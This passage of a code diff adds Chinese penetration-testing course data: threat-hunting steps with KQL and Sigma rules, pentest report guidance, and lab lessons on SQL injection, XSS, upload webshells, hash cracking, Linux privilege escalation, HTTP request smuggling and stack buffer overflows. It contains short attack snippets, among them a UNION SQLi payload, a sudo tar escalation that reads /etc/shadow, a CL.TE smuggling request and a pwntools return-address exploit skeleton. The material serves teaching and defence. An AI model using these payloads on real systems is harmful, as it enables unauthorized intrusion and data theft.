+    '用 OPA Gatekeeper 写一条策略，禁止任何带 hostPath 的 Pod，并验证它能拦住你之前的逃逸 YAML。'
+  ]
+}
+],
+'m9': [
+{
+  id:'l9-3', title:'威胁狩猎：在没有告警的地方找攻击', time:'45 分钟', level:'高级',
+  tags:['ATT&CK','威胁狩猎','Sigma','KQL'],
+  goal:[
+    '用 ATT&CK 把「我要找什么」变成一个可执行假设',
+    '从数据源出发写出第一条狩猎查询',
+    '把一次狩猎的产出沉淀成可复用的检测规则'
+  ],
+  concepts:[
+    {t:'狩猎 vs 监控', d:'监控是「等规则响」，狩猎是「假设有人已经进来了，主动去找证据」。前者依赖已知，后者面向未知。'},
+    {t:'假设驱动', d:'好假设长这样：攻击者可能用 certutil 下载 payload，因为它是系统自带、不易被杀。然后去找 certutil 的异常调用。'},
+    {t:'ATT&CK', d:'把攻击拆成战术（为什么）与技术（怎么做）。它给你一张地图，避免只盯某几个 IoC。'}
+  ],
+  steps:[
+    {title:'从一个技术开始，而不是从日志开始',
+     cmd:`# 选一个技术，例如 T1105 Ingress Tool Transfer
+# 问三个问题：它会留下什么痕迹？哪些数据源能看到？正常行为长什么样？`,
+     why:'一上来就翻日志会淹死。先锁定技术，再反推数据源，搜索范围立刻收窄。ATT&CK 的每个技术页都列了 Detection 建议，是最好的起点。',
+     out:'一句可验证的假设：攻击者可能用 certutil -urlcache 下载工具。',
+     hints:['挑「高价值 + 数据充足」的技术先做，比如 PowerShell、计划任务、服务安装。','别一次挑十个，一周做一个技术就很好。']},
+    {title:'确认数据源够不够',
+     cmd:`# Windows：Sysmon（1 进程创建、3 网络、11 文件、13 注册表）
+# Linux：auditd、bash history、journald
+# 网络：Zeek、DNS 日志、代理日志
+# 云：CloudTrail / 操作审计`,
+     why:'没有数据就没有狩猎。先确认「这个技术的行为会不会被记录」，再写查询——否则你查半天没结果，其实是因为根本没采集。',
+     out:'一张「技术 → 数据源 → 是否已采集」的对照表。',
+     hints:['Sysmon 的配置决定一切，默认配置漏很多。','云上先确认审计日志是开着的，很多事故后发现压根没开。']},
+    {title:'写查询：从粗到细',
+     cmd:`# KQL（Defender / Sentinel）示例
+DeviceProcessEvents
+| where FileName in~ ("certutil.exe","bitsadmin.exe")
+| where ProcessCommandLine has_any ("urlcache","http://","https://")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
+     why:'先用「程序名 + 可疑参数」粗筛，再看结果里的正常业务，逐步加排除条件。一次就写出完美查询是不现实的，狩猎本身就是迭代。',
+     out:'一个能跑出结果、且结果量在可人工复核范围内的查询。',
+     hints:['结果太多就加 has_any 限定，太少就去掉一个条件。','把「正常」的例子记下来，它们是你下一条排除条件。']},
+    {title:'验证：真阳性还是噪音',
+     cmd:`# 对每条命中问：
+# 1) 这个命令行在这台机器上合理吗？
+# 2) 父进程是谁？时间点是否异常？
+# 3) 有没有后续网络连接或文件落地？`,
+     why:'狩猎的产出不是「一堆命中」，而是「几条被证实的结论」。没有上下文的单条日志几乎总是误报，必须横向关联。',
+     out:'一份标注了真/假阳性的结果表。',
+     hints:['关注「开发机上的运维脚本」这类高频误报源。','把误报原因写下来，它们会变成规则的排除项。']},
+    {title:'沉淀：把狩猎变成检测',
+     cmd:`# 把验证过的逻辑写成 Sigma 规则，转成各平台查询
+title: Suspicious Certutil Download
+logsource: {product: windows, category: process_creation}
+detection:
+  selection: {Image|endswith: '\\certutil.exe', CommandLine|contains: 'urlcache'}
+  condition: selection
+level: medium`,
+     why:'一次狩猎只解决一次问题；写成规则才能持续生效。Sigma 是厂商无关的规则格式，写一次可以转成 Splunk、Elastic、Sentinel 的查询。',
+     out:'一条可部署的检测规则 + 一条对应的 ATT&CK 映射。',
+     hints:['规则要写清楚误报场景，否则运维会关掉它。','上线后跟踪命中率，两周没人处理就说明规则设计有问题。']}
+  ],
+  deep:[
+    {t:'为什么 IoC 越来越没用', d:'攻击者改一个域名、重编译一次样本，哈希和 IP 就全变了。行为特征（TTP）迁移成本高得多，所以现代检测重心在行为。'},
+    {t:'数据源优先级', d:'进程创建 + 命令行 > 网络连接 > 文件落地 > 注册表。命令行信息量最大，也最容易被漏采。'},
+    {t:'狩猎的失败模式', d:'最常见的失败不是查不到，而是「查出一堆不敢下结论的结果」。所以狩猎要有明确的成功标准：证实或排除。'}
+  ],
+  labs:[
+    {name:'Atomic Red Team', task:'在测试机上执行 3 个技术（T1059.001、T1053.005、T1105），确认你的日志能捕获到，并写出查询。'},
+    {name:'DetectionLab', task:'搭起来后，用 Sysmon 数据复现一次「下载并执行」的完整链路，画出进程树。'},
+    {name:'Security Onion（可选）', task:'导入 pcap，用 Zeek 日志找一次可疑 DNS 查询。'}
+  ],
+  pitfalls:[
+    '没有假设，直接在 SIEM 里瞎翻，最后什么也没找到。',
+    '只看单条日志，不看进程树和时间上下文。',
+    '狩猎完不写规则，同样的洞下次还得再找一遍。'
+  ],
+  quiz:{q:'威胁狩猎最有效的起点是？',
+  opts:['把 SIEM 里所有日志翻一遍','选一个 ATT&CK 技术，形成可验证假设，再反推数据源','等告警响',"只看最新的威胁情报 IoC"],
+  a:1, exp:'假设驱动能把无限大的日志空间收窄成几个可验证的问题。ATT&CK 提供结构，数据源决定可行性，验证决定产出。'},
+  challenge:[
+    '选一个你关心的 ATT&CK 技术，写完整的狩猎方案：假设、数据源、查询、验证标准、沉淀规则。',
+    '把一条 Sigma 规则转换成 Splunk SPL 和 Sentinel KQL 两个版本，对比语法差异。'
+  ]
+}
+],
+'m10': [
+{
+  id:'l10-2', title:'写一份客户看得懂的渗透报告', time:'40 分钟', level:'进阶',
+  tags:['报告','CVSS','沟通','交付'],
+  goal:[
+    '掌握一份标准渗透报告的结构',
+    '用 CVSS 向量 + 业务影响给风险定级',
+    '把技术发现翻译成决策层能听懂的语言'
+  ],
+  concepts:[
+    {t:'报告才是交付物', d:'客户买的不是 shell，是「我的风险在哪、怎么修、先修哪个」。没有报告，测试等于没做。'},
+    {t:'CVSS 的局限', d:'CVSS 衡量技术严重性，不衡量业务影响。一个内网低权限的 SQL 注入，CVSS 可能 8.0，但对这个客户也许不如一个前台信息泄露紧急。'},
+    {t:'可复现', d:'每条发现都要能让另一个工程师按步骤复现。复现不了，就没法验证修复。'}
+  ],
+  steps:[
+    {title:'先搭骨架',
+     cmd:`1. 摘要（给管理层，1 页）
+2. 范围与方法（测了什么、没测什么、时间）
+3. 风险总览（按等级统计 + 趋势）
+4. 详细发现（每条：描述/影响/复现/证据/修复）
+5. 修复优先级路线图
+6. 附录（工具、账号、原始输出）`,
+     why:'读者分两类：决策层只看摘要和路线图，技术团队只看详细发现。结构清晰的报告能让两类人各取所需，而不是让所有人从头读到尾。',
+     out:'一份目录清晰、每节都有明确读者的报告。',
+     hints:['摘要里不要出现 sqlmap、payload 这类词，用业务语言。','范围要写清「未测试」的部分，这是保护自己的条款。']},
+    {title:'风险定级：CVSS + 业务上下文',
+     cmd:`# CVSS 3.1 向量示例
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  → 9.8
+# 再叠加业务维度：
+# 数据敏感度 / 暴露面 / 利用难度 / 是否有补偿控制`,
+     why:'CVSS 给一个客观基线，避免「凭感觉定级」。但最终优先级必须叠加业务：能读 12 万用户手机号的注入，永远比一个需要物理接触的漏洞更急。',
+     out:'每条发现都有 CVSS 分数 + 业务影响说明 + 最终优先级。',
+     hints:['别只写分数，写清「攻击者需要什么前提」。','同一漏洞在不同资产上，优先级可以不同。']},
+    {title:'写详细发现：四段式',
+     cmd:`标题：订单查询接口存在 SQL 注入
+影响：可读取全量订单与用户手机号（约 12 万条）
+复现：1) 登录测试账号 2) 请求 ... 3) 参数 id 加单引号 ...
+修复：改用参数化查询；数据库账号降权；关闭详细报错`,
+     why:'四段式强迫你把「是什么、多严重、怎么证明、怎么修」讲清楚。缺任何一段，报告都会被打回来：没有复现，客户无法验证；没有修复，客户不知道怎么办。',
+     out:'每条发现都能独立成页，且能交给另一个工程师复现。',
+     hints:['截图要打码，别把真实用户数据放进报告。','复现步骤写具体的请求与响应，不要写「用 sqlmap 跑一下」。']},
+    {title:'修复建议要能落地',
+     cmd:`# 差：加强输入校验
+# 好：在 OrderController.java:88 使用 PreparedStatement，
+#     并将 db_user 的权限收敛为 SELECT on orders, users
+#     预计工作量：0.5 人日；验证方式：重放附录 A 的 payload`,
+     why:'「加强安全意识」这种建议等于没说。可落地的建议包含：改哪个文件、改成什么、谁来做、多久、怎么验证。这才叫交付价值。',
+     out:'每条建议都有位置、动作、验证方式。',
+     hints:['按「立即 / 短期 / 长期」分组，客户好排期。','给出临时缓解措施（WAF 规则、下线接口），争取修复时间。']},
+    {title:'汇报：5 分钟讲完',
+     cmd:`# 结构：我们做了什么 → 最严重的 3 个问题 → 攻击者能造成什么后果 → 建议先做什么
+# 一条原则：先讲业务后果，再讲技术细节`,
+     why:'汇报的对象通常不是工程师。他们关心的是「会不会上新闻、会不会被罚款、要花多少钱」。把技术风险翻译成业务语言，建议才会被采纳。',
+     out:'一页纸的汇报提纲，5 分钟能讲完。',
+     hints:['准备一个「如果我是攻击者，我会怎么用它」的场景描述，最有说服力。','别在汇报里炫技，客户不关心你用了什么工具。']}
+  ],
+  deep:[
+    {t:'为什么「高危漏洞数量」不是好指标', d:'10 个需要内网权限的高危，不如 1 个公网可利用的中危。指标要能反映真实风险，而不是方便统计。'},
+    {t:'证据链与合规', d:'等保、ISO 27001 审计时，报告是「你确实做过测试」的凭证。所以时间、范围、方法、原始输出都要留档。'},
+    {t:'复测与闭环', d:'修复后要复测并出复测报告。没有复测，客户永远不知道洞到底补上没有。'}
+  ],
+  labs:[
+    {name:'用你打过的靶机写一份完整报告', task:'选 DVWA 或 HTB 的一台机器，按六段结构写完整报告，包含 3 条发现、CVSS 评分、修复建议。'},
+    {name:'互相评审', task:'找一个人按你的报告复现，看他能不能不问你任何问题就走通——这是报告质量的唯一标准。'}
+  ],
+  pitfalls:[
+    '通篇工具输出，没有一句自己的判断。',
+    '只写漏洞不写业务影响，客户不知道为什么要修。',
+    '截图里带着真实用户数据，造成二次泄露。'
+  ],
+  quiz:{q:'一份好的渗透报告，判断质量最硬的标准是？',
+  opts:['漏洞数量够多','页数够长','另一个工程师能只按报告独立复现每一条发现','用了最新的工具'],
+  a:2, exp:'可复现意味着描述准确、证据充分、步骤完整，也意味着修复后能验证。这是报告从「文档」变成「工程交付物」的关键。'},
+  challenge:[
+    '把同一份报告改写成两个版本：一版给 CTO（1 页，纯业务语言），一版给开发（详细复现步骤）。',
+    '给自己写的每条修复建议标注「工作量（人日）+ 验证方法」，删掉所有无法验证的建议。'
+  ]
+}
+],
+
+};
+
+const PATCH = {
+'l1-2': {
+  deep:[
+    {t:'SYN 扫描到底发生了什么', d:'发 SYN → 收到 SYN/ACK 就判定开放，然后立刻发 RST 断开，从不完成三次握手。所以叫「半开」，日志里往往只有一条不完整的连接记录。'},
+    {t:'-sU 为什么慢得离谱', d:'UDP 无连接，开放的端口可能根本不回包，关闭的才回 ICMP unreachable。没回包只能超时重试，一个端口动辄几秒——所以 UDP 扫描要单独安排时间窗。'},
+    {t:'速度与隐蔽的矛盾', d:'-T4 快，但流量特征明显；-T2 慢，混在正常流量里。真实项目里速率必须和客户约定，把生产系统扫挂是事故，不是「技术问题」。'}
+  ],
+  labs:[
+    {name:'Metasploitable 2', task:'全端口扫描 + 版本探测，列出至少 5 个「版本已知有 CVE」的服务，并写出对应 CVE 编号。'},
+    {name:'DVWA 容器', task:'扫 192.168.56.0/24 找到 DVWA 所在主机的 8080 端口，确认服务与版本。'},
+    {name:'任意靶机', task:'跑一次 --script vuln，把工具报的漏洞逐条手工验证，统计误报率。'}
+  ],
+  challenge:[
+    '写一个脚本，把 nmap 的 XML 输出（-oX）解析成「IP / 端口 / 服务 / 版本 / 候选 CVE」的 CSV。',
+    '用 tcpdump 同时抓包，对比 -sS 与 -sT 两种扫描产生的包数量与握手完整性。'
+  ]
+},
+'l2-2': {
+  deep:[
+    {t:'information_schema 是地图', d:'它存的是「数据库自己的目录」：tables 记表名，columns 记字段名。所以注入的标准顺序是：库 → 表 → 字段 → 数据，一步都不跳。'},
+    {t:'UNION 的两个硬约束', d:'列数必须相同，对应位置的类型要兼容。这就是为什么必须先 order by 猜列数、再用数字占位确定回显位。'},
+    {t:'ORDER BY 为什么能测列数', d:'它后面只能跟存在的列序号，超出就报 Unknown column。报错前那个数字就是列数——一个「用错误换信息」的经典技巧。'}
+  ],
+  labs:[
+    {name:'DVWA · SQL Injection (low)', task:'用 union 取出 users 表全部 5 条记录的用户名与密码哈希，并把哈希拿去离线破解。'},
+    {name:'sqli-labs · Less-1', task:'不用 sqlmap，纯手工完成报错注入，拿到库名、表名、字段名、数据四级信息。'},
+    {name:'Juice Shop', task:'找到登录功能的 SQL 注入挑战并完成（提示：试试 admin 邮箱加一个单引号）。'}
+  ],
+  challenge:[
+    '写一个 Python 脚本，输入注入点后自动 dump 指定表的前 20 行，要求带进度显示。',
+    '在 DVWA medium 难度下重做一次（数字型、无引号），说明为什么原来的 payload 失效、新 payload 为什么成立。'
+  ]
+},
+'l2-3': {
+  deep:[
+    {t:'三种上下文的逃逸方式', d:'HTML 正文直接写标签；属性值里要先闭合引号；<script> 里则要闭合字符串或括号。payload 不通用，是因为「你落在哪」不同。'},
+    {t:'CSP 的 nonce 为什么有效', d:'服务器每次响应生成随机 nonce，只有带这个 nonce 的 script 才执行。注入的标签猜不到 nonce，于是即使注入成功也执行不了。'},
+    {t:'HttpOnly 只挡一半', d:'它能防「偷 Cookie」，但挡不住页面被篡改、表单被劫持、请求被伪造。别把它当成 XSS 的解法。'}
+  ],
+  labs:[
+    {name:'DVWA · XSS (Stored) low', task:'在留言板写入 payload，验证刷新后仍执行；再打开 HttpOnly 观察 cookie 是否还能读到。'},
+    {name:'PortSwigger · XSS 前 3 关', task:'分别完成 HTML 上下文、属性上下文、JavaScript 上下文三种逃逸。'},
+    {name:'Juice Shop', task:'完成 DOM XSS 与「绕过 CSP」相关挑战各一个。'}
+  ],
+  challenge:[
+    '写一个最简单的 XSS 过滤器（黑名单），然后构造 3 种绕过它的 payload，说明每种绕过的原理。',
+    '给一个页面加上 CSP（default-src self; script-src nonce），验证你之前的 payload 全部失效。'
+  ]
+},
+'l2-4': {
+  deep:[
+    {t:'上传为什么等于 RCE', d:'三个条件同时成立才危险：能上传、能访问、能被解析。缺一个就只是「存了个文件」，所以修复也围绕这三点。'},
+    {t:'解析漏洞比后缀绕过更狠', d:'Apache 的 shell.php.jpg 多后缀解析、Nginx 的 %00 截断、IIS 的分号解析——这些是服务器配置问题，改后缀根本防不住。'},
+    {t:'二次渲染与图片马', d:'有些系统会重新压缩图片，payload 可能被抹掉；所以要选「重新编码后仍保留数据」的位置（如 EXIF、IDAT 块）。'}
+  ],
+  labs:[
+    {name:'DVWA · Upload（low + medium）', task:'low 直接传 php；medium 用 Burp 改 Content-Type 为 image/png 再传，对比两次结果差异。'},
+    {name:'upload-labs · Pass-1 ~ Pass-5', task:'逐关记录「检测方式 → 绕过手法 → 原理」，整理成一张表。'},
+    {name:'Juice Shop', task:'完成文件上传相关挑战（提示：看响应里的路径，以及允许的类型）。'}
+  ],
+  challenge:[
+    '写一段 Nginx 配置，让 /uploads 目录下的 .php 文件不被解析，并验证你之前的 webshell 失效。',
+    '复现一次「上传 + 目录穿越」组合：把文件名改成 ../../shell.php，观察落到哪里。'
+  ]
+},
+'l4-1': {
+  deep:[
+    {t:'GPU 为什么快几百倍', d:'哈希是天然并行的整数运算，GPU 有几千个核心，正好适合「同一算法 × 海量候选」。这就是为什么 MD5 在 GPU 面前等于没有。'},
+    {t:'规则攻击比字典更狠', d:'在 rockyou 基础上加规则（首字母大写、末尾加数字、l33t 替换），命中率能翻几倍。真实口令几乎都是「单词 + 变形」。'},
+    {t:'为什么 bcrypt 让 GPU 失效', d:'它故意消耗内存且迭代多轮，GPU 的并行优势被内存带宽卡死。攻击成本从「秒」变成「月」，防御就成立了。'}
+  ],
+  labs:[
+    {name:'DVWA · 数据库哈希', task:'把 users 表的 5 条 MD5 拿去 john 破解，统计 rockyou 的命中率。'},
+    {name:'hashcat 规则模式', task:'用 -r 规则文件对同一批哈希再跑一次，比较命中数量差异。'},
+    {name:'在线对比（可选）', task:'用 CrackStation 查同一个哈希，理解「为什么不能把公司哈希传到公网」。'}
+  ],
+  challenge:[
+    '写一个 hashcat 规则文件，覆盖「首字母大写 + 末尾两位数字 + a→@」三种变形，并测命中率。',
+    '用 Python 生成 10 万个 bcrypt(cost=12) 哈希并计时，估算攻击者破解一年能试多少个候选。'
+  ]
+},
+'l5-2': {
+  deep:[
+    {t:'SUID 的本质是「借身份」', d:'文件带 s 位就以属主身份运行。所以真正要找的不是「有 SUID 的文件」，而是「有 SUID 且能执行命令或读写文件」的程序。'},
+    {t:'sudo 的通配符陷阱', d:'允许 sudo tar * 就等于允许 sudo tar -cf /dev/null /etc/shadow --checkpoint-action=exec=sh——通配符让参数完全可控，等于给了 root。'},
+    {t:'cron + PATH 劫持', d:'定时任务里用相对命令名（如 backup.sh 调用 tar），且 PATH 里包含你可写的目录，你放一个假 tar 进去，任务执行时就是 root 权限跑你的代码。'}
+  ],
+  labs:[
+    {name:'THM · Linux Privilege Escalation', task:'完成房间里的 SUID、sudo、cron 三类提权任务，每个写下关键命令。'},
+    {name:'VulnHub · DC-1', task:'从 Web 入口打到 root，全程只用 4 个工具，记录每一步的权限变化。'},
+    {name:'自建环境', task:'在 Ubuntu 里造一个带危险 SUID 的程序（如 cp），验证 GTFOBins 的利用方式，然后修掉它。'}
+  ],
+  challenge:[
+    '写一个脚本：枚举 SUID 文件并与 GTFOBins 的清单比对，输出可利用项与对应命令。',
+    '用 sudo vim / sudo find / sudo awk 三种方式各拿一次 root shell，说明它们的共同点。'
+  ]
+},
+
+};
+
+Object.keys(EXTRA).forEach(k=>{
+  const m = DATA.find(x=>x.id===k);
+  if(m) m.lessons.push(...EXTRA[k]);
+});
+Object.keys(PATCH).forEach(id=>{
+  let hit=null;
+  DATA.forEach(m=>m.lessons.forEach(l=>{ if(l.id===id) hit=l; }));
+  if(hit) Object.assign(hit, PATCH[id]);
+});
+
+/* ============ master track ============ */
+const MASTER = {
+  levels:[
+    {code:'D0',name:'会敲命令',can:'照着步骤跑通工具，看懂输出。',self:['能独立装好 Kali 与靶场','能用 nmap / gobuster 拿到基本信息'],gate:'关卡：不看教程，独立拿下 DVWA low 全部 7 关。'},
+    {code:'D1',name:'能打单点',can:'看到报错和指纹，能判断该用哪类漏洞。',self:['能手工完成 union 注入与反射型 XSS','能解释每个参数为什么这么写'],gate:'关卡：THM 任意 10 个 easy 房间，不看 writeup。'},
+    {code:'D2',name:'能串成链',can:'从外网到内网，把漏洞连成一条攻击路径。',self:['能独立完成一台 HTB easy 全流程','能写清攻击链与提权路径'],gate:'关卡：HTB 3 台 easy + 1 台 medium，全程自记笔记。'},
+    {code:'D3',name:'能读源码',can:'把漏洞下沉到代码/协议/配置层，解释根因。',self:['能审计一个中型 PHP/Java 项目找出注入点','能讲清 CL/TE 走私的解析差异'],gate:'关卡：在开源项目里提交一个被确认的安全 issue。'},
+    {code:'D4',name:'能造工具',can:'现有工具不好用时，自己写一个。',self:['能写 Burp 插件或 sqlmap tamper','能用 AFL++ / CodeQL 做自动化发现'],gate:'关卡：自研工具发现一个真实目标的问题并修复。'},
+    {code:'D5',name:'能定义问题',can:'发现别人没发现的问题，并把方法沉淀成可复用的东西。',self:['有 CVE / 被采纳的检测规则 / 公开研究','能带人、能出题、能评审'],gate:'关卡：一篇公开研究 + 一套可复现实验环境。'}
+  ],
+  depth:[
+    {k:'L1 现象',t:'看到什么',d:'报错、回显、指纹、异常流量。多数人停在这里，只会套 payload。'},
+    {k:'L2 机制',t:'为什么会这样',d:'解析顺序、状态机、内存布局、信任传递。能复现才算懂。'},
+    {k:'L3 源码',t:'哪一行导致的',d:'定位到函数、分支、边界检查缺失处。这是能改代码修漏洞的门槛。'},
+    {k:'L4 设计',t:'为什么当初这么设计',d:'权衡、历史包袱、兼容性。看懂设计才能预测别处也错，才能绕过修补。'}
+  ],
+  methods:[
+    {t:'① 向下沉一层再走',d:'每学一个 payload，追问三句：谁解析它？在哪一行判断？为什么没拦住？答不出就说明还在 L1。'},
+    {t:'② 复现而不是记住',d:'把漏洞在本地搭出来（哪怕自己写 20 行有漏洞的代码），比刷 50 个 writeup 有效。能复现 = 能控制变量。'},
+    {t:'③ 出题检验掌握',d:'能设计一关让别人的 payload 失败，说明你理解了边界条件。出题是最高强度的自测。'},
+    {t:'④ 双轨记录',d:'攻击轨写「我做了什么」，防御轨写「日志里长什么样 / 怎么才能拦住」。两条轨都写，才会从工具人变成工程师。'}
+  ],
+  topics:[
+    {id:'t1',ic:'🧬',cat:'Web',lv:'D3',time:'45 分钟',
+     title:'HTTP 报文是怎么被切分的：请求走私的真正根因',
+     q:'同一段字节，前端看到 1 条请求，后端却看到 2 条——差异出在解析器，不在 payload。',
+     body:[
+      {h:'1. 消息边界靠什么确定',p:'HTTP/1.1 是流式协议，没有帧头。接收方只能靠两个头部之一确定 body 长度：Content-Length（字节数）或 Transfer-Encoding: chunked（分块，每块自带长度）。规范要求：两者同时出现时，Transfer-Encoding 优先，并且应当直接拒绝这种消息。'},
+      {h:'2. 走私就诞生在「应当」二字上',p:'不同实现对这个「应当」的处理不一样：有的按 TE 解析、有的按 CL 解析、有的先看 CL、有的遇到畸形 chunk 就回退。当前端按 CL 认为 body 只有 6 字节，后端按 chunked 认为还有后续 chunk，剩下的字节就被后端当成「下一条请求的开头」——而这条请求恰好排在你后面那个用户的 TCP 连接里。'},
+      {h:'3. 为什么它比普通注入更危险',p:'普通注入影响你自己的请求；走私污染的是连接池里的下一条请求，也就是说你可以影响别人的请求、甚至劫持管理员的会话。这也是为什么它长期是赏金榜上的高价值漏洞：影响面取决于前置代理的复用策略，而不是目标应用本身。'}
+     ],
+     code:{l:'http',t:'# CL.TE 最经典形态：前端信 CL，后端信 TE\nPOST / HTTP/1.1\nHost: target\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG\n# 前端读到 6 字节就转发完毕；后端把 "0\\n\\n" 当结束块，剩下的 "G" 留在缓冲区，与下一条请求拼接成 GPOST /\n\n# 验证思路（不要在非授权目标上试）：\n# 1. 先发一个「探测」请求，观察响应是否被延迟/异常\n# 2. 用时间差法：走私一个带慢响应的请求，看自己的正常请求是否被卡住\n# 3. 差分法：CL.TE / TE.CL / TE.TE 三种组合逐个试，只有一种会生效'},
+     exp:'本地起两套解析器做对照实验：nginx 反代 + 后端 Node/Gunicorn，用 nc 手工发上面这段字节，在前后端各打一行日志，亲眼看「长度」在两个进程里算出的不同结果。这一步做完，payload 长什么样就不需要背了。',
+     check:['能画出 CL 与 TE 两条解析路径的分叉点','能解释为什么 TE.CL 的利用通常更难但更可靠','能说出至少两种服务端缓解措施及其绕过可能'],
+     read:['RFC 7230 §3.3.3（消息体长度）','PortSwigger: HTTP request smuggling（含各变体）']},
+    {id:'t2',ic:'🗄',cat:'Web',lv:'D3',time:'40 分钟',
+     title:'为什么这条注入能跑：从 SQL 执行计划看注入的成立条件',
+     q:'注入能成立，本质是「数据」被引擎当成了「语法」。理解这一点，才知道什么时候注不进去。',
+     body:[
+      {h:'1. 解析顺序决定了注入点',p:'SQL 是编译执行的：词法分析 → 语法分析 → 生成执行计划 → 执行。参数化查询把用户输入绑定在「执行」阶段，所以无论输入什么，它永远只是值。字符串拼接则把输入送进了「语法分析」阶段，输入里的引号、注释符、分号会改变语法树结构。'},
+      {h:'2. 为什么有的注入读不出数据',p:'能注不等于能读。union 需要列数与类型匹配；盲注需要能构造布尔差异或时间差异；堆叠查询需要驱动支持多语句（PDO 默认不支持，mysqli 的 multi_query 支持）。同一个注入点在三种条件下表现完全不同——这就是为什么 writeup 里的 payload 换到你的目标上会失败。'},
+      {h:'3. 二阶注入与 ORM 的假安全',p:'很多系统对入口做了转义，但把「转义后的字符串」存进库，之后又从库里取出拼进第二条 SQL——转义在这一层失效，这叫二阶注入。ORM 也不是万能：whereRaw、order by 拼接、动态表名这些地方绕过了参数绑定，是 ORM 项目里最常见的真实漏洞位置。'}
+     ],
+     code:{l:'sql',t:'-- 能跑的前提：注入进入语法分析阶段\nSELECT id, name FROM users WHERE name = \'$input\';\n-- input = \' UNION SELECT 1,version()-- -\nSELECT id, name FROM users WHERE name = \'\' UNION SELECT 1,version()-- -\';\n\n-- 参数化后，同样的输入只是一段字符串，语法树不变\nSELECT id, name FROM users WHERE name = ?;   -- 参数: "\' UNION SELECT 1,version()-- -"\n\n-- 审计时重点看这些「绕开绑定」的写法：\n-- order by ${col} / whereRaw("id = " + id) / 表名、列名拼接 / LIMIT 拼接'},
+     exp:'自己写 30 行 PHP 或 Node 代码，做两个接口：一个拼接、一个参数化。用同一串 payload 打两个接口，打印最终执行的 SQL 语句。再做一次「转义后入库、取出拼接」的二阶实验，观察转义为什么失效。',
+     check:['能说出 union 注入的三个前提（列数、类型、回显位）','能区分「能注」与「能读」的差别','能在代码里指出哪些写法绕过了参数绑定'],
+     read:['OWASP: SQL Injection Prevention Cheat Sheet','《SQL 注入攻击与防御》第 2 版']},
+    {id:'t3',ic:'🌐',cat:'Web',lv:'D3',time:'40 分钟',
+     title:'XSS 不是「弹个框」：浏览器渲染管线与同源模型的边界',
+     q:'XSS 的本质是「你的字符串被某个解析上下文当成了代码」。上下文不同，逃逸方式完全不同。',
+     body:[
+      {h:'1. 五个解析上下文，五套逃逸规则',p:'同一个变量可能落在 HTML 文本、HTML 属性、URL、JS 字符串、CSS 里。落在 HTML 文本里要闭合标签；落在属性里要闭合引号；落在 <script> 里要闭合字符串或提前结束脚本；落在 href 里可以用 javascript: 伪协议。这就是为什么「统一转义 &<>"」并不够——HTML 实体在 <script> 内部不生效。'},
+      {h:'2. DOM XSS 绕过了服务端',p:'innerHTML、document.write、eval、setTimeout(字符串)、jQuery 的 $() 都可能把字符串当 HTML/代码执行。这类漏洞服务端完全看不到 payload，WAF 也拦不住，因为 payload 从不经过网络请求——它来自 location.hash 或 localStorage。检测 DOM XSS 必须读 JS 源码里的「source → sink」数据流。'},
+      {h:'3. 同源模型才是它危险的真正原因',p:'同源策略允许同源页面互相读取 DOM、共享 cookie。XSS 让你在「目标源」里执行代码，于是你能读它的 localStorage、发它的 API 请求（带 cookie）、改它的页面骗管理员操作。所以 XSS 的价值不是弹窗，而是「以受害者身份在目标源内为所欲为」，包括绕过 CSRF token。'}
+     ],
+     code:{l:'html',t:'<!-- 同一个变量，四种上下文 -->\n<div>${name}</div>                       <!-- HTML 文本：闭合标签 -->\n<input value="${name}">                 <!-- 属性：闭合引号 -->\n<a href="${url}">x</a>                  <!-- URL：javascript: / data: -->\n<script>var n = "${name}";<\/script>     <!-- JS 字符串：闭合引号或 <\/script> -->\n\n<!-- DOM 侧的危险 sink -->\nel.innerHTML = location.hash.slice(1);   // 直接执行\n$(".box").html(decodeURIComponent(h));  // jQuery 同样危险\n\n<!-- 正确做法：按上下文编码 + CSP 兜底 -->\n<!-- Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-xxx\' -->'},
+     exp:'在一个静态页面上做四组实验：把同一个字符串分别塞进上面四个位置，观察哪些需要闭合、哪些需要实体、哪些直接被拦。然后加上 CSP，再试一次，体会「编码修复注入、CSP 缩小影响面」的分工。',
+     check:['能针对四种上下文写出对应的编码方式','能指出三个 DOM XSS 的典型 source 与 sink','能解释 CSP 为什么不能替代输出编码'],
+     read:['OWASP XSS Prevention Cheat Sheet','HTML Living Standard: 解析算法概述']},
+    {id:'t4',ic:'🧱',cat:'Pwn',lv:'D4',time:'60 分钟',
+     title:'栈帧、调用约定与返回地址：从 C 源码到 ROP 的完整链路',
+     q:'缓冲区溢出能劫持执行流，靠的不是「覆盖」，而是「函数返回时从栈上取走了你写的东西」。',
+     body:[
+      {h:'1. 一次函数调用在内存里发生了什么',p:'call 指令把返回地址压栈并跳到函数入口；函数序言 push rbp; mov rbp,rsp; sub rsp,N 建立栈帧；局部数组就住在 rbp-N 的位置。当输入长度超过数组容量，就会顺着低地址向高地址覆盖：先是局部变量、保存的 rbp，然后是返回地址。函数执行 ret 时，CPU 从栈顶弹出这个值装进 rip——执行流就归你了。'},
+      {h:'2. 为什么现代系统不那么好打了',p:'NX 让栈不可执行，于是要 ROP（复用已有代码片段）；ASLR 让地址随机，于是要先泄漏一个地址；Canary 在返回地址前放一个随机值并在返回前校验，于是要先泄漏 canary；PIE 让代码段也随机。这四道防线决定了你的利用链顺序：先泄漏、再算基址、再拼 rop chain。'},
+      {h:'3. 偏移量不是猜出来的',p:'找偏移的标准做法：pattern_create 生成循环特征串，崩溃时看 rip 的值，用 pattern_offset 反查。或者在 gdb 里看 rbp 与缓冲区首地址的距离。偏移错了，整个利用链就只是「换个方式崩溃」——这是新手最常见的失败原因，占失败案例的大半。'}
+     ],
+     code:{l:'c',t:'// 有漏洞的最小样本\nvoid vuln(void){\n    char buf[64];\n    gets(buf);      // 无边界检查，向低地址的 buf 写入任意长度\n}\n// 编译：gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln\n\n# 找偏移\npython3 -c "from pwn import *; print(cyclic(200))" | ./vuln\ngdb ./vuln -ex "run < <(python3 -c \'from pwn import *;print(cyclic(200)))\')" -ex "info registers rip"\npython3 -c "from pwn import *; print(cyclic_find(0x6161616c))"\n\n# 最小利用骨架（pwntools）\nfrom pwn import *\np = process(\'./vuln\')\npayload = b\'A\'*72 + p64(0x4011a9)   # 偏移 72 覆盖到返回地址\np.sendline(payload); p.interactive()'},
